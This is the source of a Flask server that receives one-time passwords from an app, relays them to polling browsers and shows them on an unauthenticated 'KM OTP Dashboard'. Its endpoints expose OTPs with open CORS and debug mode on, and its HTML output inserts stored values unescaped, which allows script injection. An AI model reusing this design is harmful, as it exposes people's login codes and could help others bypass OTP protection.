from flask import Flask, request, jsonify, redirect, url_for
from flask_cors import CORS
from datetime import datetime
import zoneinfo
import time

app = Flask(__name__)
CORS(app)

# =========================
# Storage
# =========================
mobile_otps = []   # [{"otp":..., "token":..., "sim_number":..., "timestamp":...}]
vehicle_otps = []  # [{"otp":..., "token":..., "vehicle":..., "timestamp":...}]
otp_data = {}      # token -> list of delivered/removed OTPs (with browser_id and status)
client_sessions = {}   # (token, identifier, browser_id) -> {"first_request": datetime, "last_request": float_ts}
browser_queues = {}    # (token, identifier) -> [browser_id1, browser_id2, ...]
login_sessions = {}    # mobile_number -> [ { "timestamp":..., "source":... }, ...]

IST = zoneinfo.ZoneInfo("Asia/Kolkata")

# Config: how long without polling we consider a browser closed (seconds)
BROWSER_STALE_SECONDS = float(10)  # adjust as needed

# =========================
# Helpers
# =========================
def now_str():
    return datetime.now(IST).strftime("%Y-%m-%d %H:%M:%S")

def add_browser_to_queue(token, identifier, browser_id):
    key = (token, identifier)
    if key not in browser_queues:
        browser_queues[key] = []
    if browser_id not in browser_queues[key]:
        browser_queues[key].append(browser_id)
        client_sessions[(token, identifier, browser_id)] = {
            "first_request": datetime.now(IST),
            "last_request": time.time()
        }
    else:
        # update last_request heartbeat on repeated poll
        client_sessions[(token, identifier, browser_id)]["last_request"] = time.time()

def get_next_browser(token, identifier):
    key = (token, identifier)
    if key in browser_queues and browser_queues[key]:
        return browser_queues[key][0]
    return None

def pop_browser_from_queue(token, identifier):
    key = (token, identifier)
    if key in browser_queues and browser_queues[key]:
        browser_queues[key].pop(0)

def mark_otp_removed_to_data(token, entry, reason="stale_browser", browser_id=None):
    """
    Move an entry (dict from mobile_otps/vehicle_otps) into otp_data
    and annotate with removal reason. This prevents it from being delivered later.
    """
    record = entry.copy()
    record["removed_at"] = datetime.now(IST)
    record["removed_reason"] = reason
    if browser_id:
        record["browser_id"] = browser_id
    otp_data.setdefault(token, []).append(record)

def cleanup_stale_browsers_and_handle_pending(token, identifier):
    """
    For the given (token, identifier) queue:
    - find browsers in queue whose last_request is older than BROWSER_STALE_SECONDS.
    - For each stale browser:
        - pop it from queue
        - remove ALL pending OTPs that arrived AFTER that browser's first_request
          and move them to otp_data (marked 'stale_browser').
    This ensures OTPs that would have gone to dead browsers do not remain forever.
    """
    key = (token, identifier)
    if key not in browser_queues:
        return

    now_ts = time.time()
    # make a copy of the queue snapshot because we'll mutate browser_queues[key]
    queue_snapshot = list(browser_queues[key])
    for b in queue_snapshot:
        cs_key = (token, identifier, b)
        sess = client_sessions.get(cs_key)
        if not sess:
            # if no session info, treat as stale and pop
            try:
                browser_queues[key].remove(b)
            except ValueError:
                pass
            client_sessions.pop(cs_key, None)
            continue
        last = sess.get("last_request", 0)
        first_req_dt = sess.get("first_request", datetime.now(IST))
        # If browser hasn't polled within timeout -> stale
        if now_ts - last > BROWSER_STALE_SECONDS:
            # Pop browser from queue
            try:
                browser_queues[key].remove(b)
            except ValueError:
                pass
            client_sessions.pop(cs_key, None)
            # Now, remove ALL pending OTPs that arrived after first_request
            # and move them to otp_data with reason stale_browser
            # Determine which pending list to inspect based on identifier type:
            # We match both mobile_otps and vehicle_otps precisely by comparing values
            pending_mobile_to_move = []
            for p in list(mobile_otps):
                if p.get("token") != token:
                    continue
                if (p.get("sim_number") or "").upper() != identifier.upper():
                    continue
                if p.get("timestamp") and p["timestamp"] > first_req_dt:
                    pending_mobile_to_move.append(p)
            for p in pending_mobile_to_move:
                try:
                    mobile_otps.remove(p)
                except ValueError:
                    pass
                mark_otp_removed_to_data(token, p, reason="stale_browser", browser_id=b)

            pending_vehicle_to_move = []
            for p in list(vehicle_otps):
                if p.get("token") != token:
                    continue
                if (p.get("vehicle") or "").upper() != identifier.upper():
                    continue
                if p.get("timestamp") and p["timestamp"] > first_req_dt:
                    pending_vehicle_to_move.append(p)
            for p in pending_vehicle_to_move:
                try:
                    vehicle_otps.remove(p)
                except ValueError:
                    pass
                mark_otp_removed_to_data(token, p, reason="stale_browser", browser_id=b)

# =========================
# OTP Endpoints
# =========================
@app.route('/api/receive-otp', methods=['POST'])
def receive_otp():
    try:
        data = request.get_json(force=True)
        otp = (data.get('otp') or "").strip()
        sim_number = (data.get('sim_number') or "").strip().upper()
        token = (data.get('token') or "").strip()
        vehicle = (data.get('vehicle') or "").strip().upper()

        if not otp or not token:
            return jsonify({"status": "error", "message": "OTP and token required"}), 400

        entry = {
            "otp": otp,
            "token": token,
            "timestamp": datetime.now(IST)
        }

        if vehicle:
            entry["vehicle"] = vehicle
            vehicle_otps.append(entry)
        else:
            entry["sim_number"] = sim_number or "UNKNOWNSIM"
            mobile_otps.append(entry)

        return jsonify({"status": "success", "message": "OTP stored"}), 200
    except Exception as e:
        print("Error receiving from app:", e)
        return jsonify({"status": "error", "message": str(e)}), 400


@app.route('/api/get-latest-otp', methods=['GET'])
def get_latest_otp():
    token = (request.args.get('token') or "").strip()
    sim_number = (request.args.get('sim_number') or "").strip().upper()
    vehicle = (request.args.get('vehicle') or "").strip().upper()
    browser_id = (request.args.get('browser_id') or "").strip()

    if not token or (not sim_number and not vehicle) or not browser_id:
        return jsonify({"status": "error", "message": "token + sim_number/vehicle + browser_id required"}), 400

    identifier = sim_number if sim_number else vehicle
    add_browser_to_queue(token, identifier, browser_id)

    # Update last_request heartbeat immediately
    cs_key = (token, identifier, browser_id)
    if cs_key in client_sessions:
        client_sessions[cs_key]["last_request"] = time.time()

    # Clean up stale browsers before attempting to deliver
    cleanup_stale_browsers_and_handle_pending(token, identifier)

    # Recompute session_time and next_browser after cleanup
    session_entry = client_sessions.get((token, identifier, browser_id))
    if not session_entry:
        # It might have been removed as stale; respond waiting so browser can re-enqueue if needed
        return jsonify({"status": "waiting"}), 200
    session_time = session_entry["first_request"]
    next_browser = get_next_browser(token, identifier)

    # Vehicle OTPs
    if vehicle:
        new_otps = [
            o for o in vehicle_otps
            if o["token"] == token
            and o.get("vehicle", "").upper() == vehicle
            and o["timestamp"] > session_time
        ]
        if new_otps and next_browser == browser_id:
            latest = new_otps[0]
            try:
                vehicle_otps.remove(latest)
            except ValueError:
                pass
            latest["browser_id"] = browser_id  # include browser_id
            otp_data.setdefault(token, []).append(latest)
            pop_browser_from_queue(token, identifier)
            client_sessions.pop((token, identifier, browser_id), None)
            return jsonify({
                "status": "success",
                "otp": latest["otp"],
                "vehicle": latest["vehicle"],
                "browser_id": browser_id,
                "timestamp": latest["timestamp"].strftime("%Y-%m-%d %H:%M:%S")
            }), 200
        return jsonify({"status": "waiting"}), 200

    # Mobile OTPs
    else:
        new_otps = [
            o for o in mobile_otps
            if o["token"] == token
            and o.get("sim_number", "").upper() == sim_number
            and o["timestamp"] > session_time
        ]
        if new_otps and next_browser == browser_id:
            latest = new_otps[0]
            try:
                mobile_otps.remove(latest)
            except ValueError:
                pass
            latest["browser_id"] = browser_id  # include browser_id
            otp_data.setdefault(token, []).append(latest)
            pop_browser_from_queue(token, identifier)
            client_sessions.pop((token, identifier, browser_id), None)
            return jsonify({
                "status": "success",
                "otp": latest["otp"],
                "sim_number": latest["sim_number"],
                "browser_id": browser_id,
                "timestamp": latest["timestamp"].strftime("%Y-%m-%d %H:%M:%S")
            }), 200
        return jsonify({"status": "waiting"}), 200

# =========================
# Status / Dashboard
# =========================
@app.route('/api/status', methods=['GET', 'POST'])
def status():
    global otp_data, login_sessions

    if request.method == 'POST':
        if "delete_selected_otps" in request.form:
            tokens_to_delete = request.form.getlist("otp_rows")
            for t, idx in (x.split(":") for x in tokens_to_delete):
                idx = int(idx)
                if t in otp_data and 0 <= idx < len(otp_data[t]):
                    otp_data[t].pop(idx)
                    if not otp_data[t]:
                        otp_data.pop(t)
            return redirect(url_for('status'))

        elif "delete_all_otps" in request.form:
            otp_data.clear()
            return redirect(url_for('status'))

        elif "delete_selected_logins" in request.form:
            logins_to_delete = request.form.getlist("login_rows")
            for x in logins_to_delete:
                m, idx = x.split(":")
                idx = int(idx)
                if m in login_sessions and 0 <= idx < len(login_sessions[m]):
                    login_sessions[m].pop(idx)
                    if not login_sessions[m]:
                        login_sessions.pop(m)
            return redirect(url_for('status'))

        elif "delete_all_logins" in request.form:
            login_sessions.clear()
            return redirect(url_for('status'))

    # OTP table
    otp_rows = ""
    for t, entries in otp_data.items():
        for i, e in enumerate(entries):
            ts = e.get("timestamp", e.get("removed_at", datetime.now(IST))).strftime("%Y-%m-%d %H:%M:%S")
            otp_rows += f"""
            <tr>
                <td><input type='checkbox' name='otp_rows' value='{t}:{i}'></td>
                <td>{t}</td>
                <td>{e.get('sim_number','')}</td>
                <td>{e.get('vehicle','')}</td>
                <td>{e.get('otp','')}</td>
                <td>{e.get('browser_id','')}</td>
                <td>{ts}</td>
            </tr>
            """

    # Login table
    login_rows = ""
    for m, entries in login_sessions.items():
        for i, e in enumerate(entries):
            login_rows += f"""
            <tr>
                <td><input type='checkbox' name='login_rows' value='{m}:{i}'></td>
                <td>{m}</td>
                <td>{e['timestamp'].strftime('%Y-%m-%d %H:%M:%S')}</td>
                <td>{e.get('source','')}</td>
            </tr>
            """

    html = f"""
    <html>
    <head>
        <title>KM OTP Dashboard</title>
        <style>
            body {{ font-family: 'Segoe UI', sans-serif; background:#f9f9f9; margin:0; }}
            h2 {{ margin:20px 0; text-align:center; }}
            .container {{ display:flex; min-height:100vh; }}
            .sidebar {{ width:220px; background:#2C3E50; padding:20px; color:white; }}
            .sidebar button {{ margin-bottom:15px; width:100%; padding:10px; border:none; background:#3498DB; color:white; cursor:pointer; border-radius:5px; }}
            .content {{ flex-grow:1; padding:30px; }}
            table {{ border-collapse: collapse; width:100%; background:white; }}
            th, td {{ border:1px solid #ddd; padding:8px; }}
            th {{ background:#2980B9; color:white; }}
        </style>
        <script>
            function showSection(id){{
                window.location.href = window.location.pathname + "?section=" + id;
            }}
            window.onload = function(){{
                const params = new URLSearchParams(window.location.search);
                const section = params.get('section');
                if(section){{
                    document.getElementById('otp_section').style.display = section=='otp_section'?'block':'none';
                    document.getElementById('login_section').style.display = section=='login_section'?'block':'none';
                }} else {{
                    document.getElementById('otp_section').style.display = 'block';
                    document.getElementById('login_section').style.display = 'none';
                }}
            }}
        </script>
    </head>
    <body>
        <h2>KM OTP Dashboard</h2>
        <div class="container">
            <div class="sidebar">
                <button onclick="showSection('otp_section')">OTP DATA</button>
                <button onclick="showSection('login_section')">LOGIN DETECTIONS</button>
            </div>
            <div class="content">
                <div id="otp_section" style="display:none;">
                    <h3>OTP Data</h3>
                    <form method="POST">
                        <table>
                            <tr><th>Select</th><th>TOKEN</th><th>MOBILE NUMBER</th><th>VEHICLE</th><th>OTP</th><th>BROWSER ID</th><th>DATE</th></tr>
                            {otp_rows if otp_rows else '<tr><td colspan="7">No OTPs found</td></tr>'}
                        </table>
                        <button type="submit" name="delete_selected_otps">Delete Selected</button>
                        <button type="submit" name="delete_all_otps">Delete All</button>
                    </form>
                </div>
                <div id="login_section" style="display:none;">
                    <h3>Login Detections</h3>
                    <form method="POST">
                        <table>
                            <tr><th>Select</th><th>MOBILE</th><th>DATE</th><th>SOURCE</th></tr>
                            {login_rows if login_rows else '<tr><td colspan="4">No login detections</td></tr>'}
                        </table>
                        <button type="submit" name="delete_selected_logins">Delete Selected</button>
                        <button type="submit" name="delete_all_logins">Delete All</button>
                    </form>
                </div>
            </div>
        </div>
    </body>
    </html>
    """
    return html

# =========================
# Login Detection API
# =========================
@app.route('/api/login-detect', methods=['POST'])
def login_detect():
    try:
        data = request.get_json(force=True)
        mobile_number = (data.get('mobile_number') or "").strip().upper()
        source = (data.get('source') or "").strip().upper()
        if not mobile_number:
            return jsonify({"status": "error", "message": "mobile_number required"}), 400

        entry = {"timestamp": datetime.now(IST), "source": source}
        login_sessions.setdefault(mobile_number, []).append(entry)

        return jsonify({"status": "success", "message": "Login detected"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400


@app.route('/api/login-found', methods=['GET'])
def login_found():
    mobile_number = (request.args.get('mobile_number') or "").strip().upper()
    if not mobile_number:
        return jsonify({"status": "error", "message": "mobile_number required"}), 400

    if mobile_number in login_sessions:
        detections = [
            {"timestamp": e["timestamp"].strftime("%Y-%m-%d %H:%M:%S"), "source": e.get("source","")}
            for e in login_sessions[mobile_number]
        ]
        return jsonify({"status": "found", "mobile_number": mobile_number, "detections": detections}), 200
    else:
        return jsonify({"status": "not_found", "mobile_number": mobile_number}), 200

# =========================
# Run App
# =========================
if __name__ == '__main__':
    app.run(debug=True)
